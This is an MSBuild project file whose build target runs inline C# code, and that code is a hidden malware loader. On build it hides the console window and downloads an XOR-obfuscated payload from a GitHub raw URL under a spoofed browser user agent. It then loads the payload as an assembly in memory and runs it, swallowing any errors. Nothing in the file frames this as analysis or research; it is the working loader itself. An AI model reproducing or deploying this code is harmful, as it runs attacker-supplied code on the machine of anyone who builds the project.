<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <CoreTask/>
  </Target>
  <UsingTask TaskName="CoreTask" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Reference Include="System.Core"/>
      <Using Namespace="System"/>
      <Using Namespace="System.Net"/>
      <Using Namespace="System.Reflection"/>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Net;
        using System.Reflection;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class CoreTask : Task {
            [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
            [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr h, int c);
            public override bool Execute() {
                try {
                    ShowWindow(GetConsoleWindow(), 0);
                    var w = new WebClient();
                    w.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                    byte[] b = w.DownloadData("https://github.com/Intel-Boss/p/raw/refs/heads/main/b");
                    for (int i = 0; i < b.Length; i++) b[i] = (byte)(b[i] ^ 0x4D);
                    Assembly.Load(b).GetType("M.P").GetMethod("Run").Invoke(null, null);
                } catch {}
                return true;
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
